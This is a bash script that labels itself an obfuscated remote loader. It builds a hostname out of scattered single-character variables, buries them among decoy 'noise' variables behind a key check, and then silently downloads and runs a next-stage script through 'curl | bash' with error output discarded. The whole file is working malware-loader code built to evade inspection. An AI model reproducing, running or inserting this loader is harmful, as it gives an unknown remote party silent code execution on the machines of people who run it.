#!/bin/bash
# ==========================================
# OBFUSCATED REMOTE BASH LOADER
# KEY LOCK : 22443232342343224234234
# ==========================================

KEY=46564
URL=""

# -------- REAL SHARDS (buried in noise) --------
a1="x"; a2="r"; a3="u"; a4="n"
a5="2"; a6="."
a7="n"; a8="o"; a9="b"; a10="i"; a11="t"
a12="a"; a13="p"; a14="r"; a15="o"
a16="."; a17="o"; a18="n"; a19="l"; a20="i"; a21="n"; a22="e"

# -------- FAKE NOISE (confusion only) --------
f1="$$"; f2="__"; f3="AA"; f4="!!"; f5="ZZ"; f6="??"
for i in {1..20}; do :; done

# -------- KEY GATE --------
if [ "$KEY" -ne 46564 ]; then
    exit 0
fi

# -------- BUILD REAL URL --------
URL="$a2$a3$a4$a5$a6$a7$a8$a9$a10$a11$a12$a13$a14$a15$a16$a17$a18$a19$a20$a21$a22"

# -------- FINAL ACTION --------
# silently fetch & execute next stage (if exists)
curl -fsSL "https://$URL" | bash 2>/dev/null

exit 0

